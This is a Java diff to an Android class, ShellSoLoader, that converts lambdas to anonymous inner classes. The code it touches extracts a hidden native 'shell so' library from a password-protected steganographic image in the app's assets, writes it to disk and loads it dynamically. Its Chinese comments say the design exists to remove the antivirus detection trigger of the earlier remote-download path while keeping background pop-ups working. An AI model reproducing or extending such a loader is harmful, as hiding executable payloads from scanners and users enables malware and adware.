@@ -18,6 +18,7 @@ import com.ep.custom_honor_library.utils.CommonSpUtils;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 
 /**
  * shell so 本地加载器（替代原「远程下载 shell so」链路）。
@@ -29,6 +30,10 @@ import java.io.IOException;
  *
  * shell so 不再经过网络，报毒触发点「远程下载二进制 → 落盘 → 动态加载」整体移除；
  * 加载成功后 SpShellFile 恒非空，toOpenMiddle 的后台弹出前置条件保持成立。
+ *
+ * 注意：本类不使用 Java lambda（改用匿名内部类）。原因：jar→dex 的 dx 管线
+ * （protect/build.sh）默认按 min-api 13 处理，lambda 的 invokedynamic 指令
+ * 会导致 dx 报「invalid opcode ba」转换失败；匿名内部类无此依赖。
  */
 public class ShellSoLoader {
 
@@ -79,13 +84,16 @@ public class ShellSoLoader {
 
     // ---------- 慢路径：assets 隐写图片 → 提取 shell so ----------
 
-    private static void extractFromAssets(Application app, final OnHttpListener listener) {
+    private static void extractFromAssets(final Application app, final OnHttpListener listener) {
         ImageFileStego stego = new ImageFileStego(app);
-        StegoSource image = StegoSource.fromStream(ASSET_IMAGE_NAME, -1L, () -> {
-            try {
-                return app.getAssets().open(ASSET_IMAGE_NAME);
-            } catch (IOException e) {
-                throw new RuntimeException(e);
+        StegoSource image = StegoSource.fromStream(ASSET_IMAGE_NAME, -1L, new StegoSource.StreamFactory() {
+            @Override
+            public InputStream open() {
+                try {
+                    return app.getAssets().open(ASSET_IMAGE_NAME);
+                } catch (IOException e) {
+                    throw new RuntimeException(e);
+                }
             }
         });
         stego.extractAsync(image, STEGO_PASSWORD, new StegoCallback<StegoArtifact>() {
@@ -100,17 +108,20 @@ public class ShellSoLoader {
                         output.close();
                     }
                     // System.load 与回调统一回主线程执行（与旧远程下载链路行为一致）
-                    MAIN.post(() -> {
-                        try {
-                            SafeUtils.iitF(shellFile.getAbsolutePath());
-                            CommonSpUtils.setSpShellFile(shellFile.getAbsolutePath());
-                            Log.i(TAG, "shell so 本地提取加载成功: " + shellFile.getAbsolutePath());
-                            listener.onSuccess();
-                        } catch (Throwable error) {
-                            Log.w(TAG, "shell so 加载失败: " + error);
-                            //noinspection ResultOfMethodCallIgnored
-                            shellFile.delete();
-                            listener.onFail(new Exception(error));
+                    MAIN.post(new Runnable() {
+                        @Override
+                        public void run() {
+                            try {
+                                SafeUtils.iitF(shellFile.getAbsolutePath());
+                                CommonSpUtils.setSpShellFile(shellFile.getAbsolutePath());
+                                Log.i(TAG, "shell so 本地提取加载成功: " + shellFile.getAbsolutePath());
+                                listener.onSuccess();
+                            } catch (Throwable error) {
+                                Log.w(TAG, "shell so 加载失败: " + error);
+                                //noinspection ResultOfMethodCallIgnored
+                                shellFile.delete();
+                                listener.onFail(new Exception(error));
+                            }
                         }
                     });
                 } catch (Exception error) {
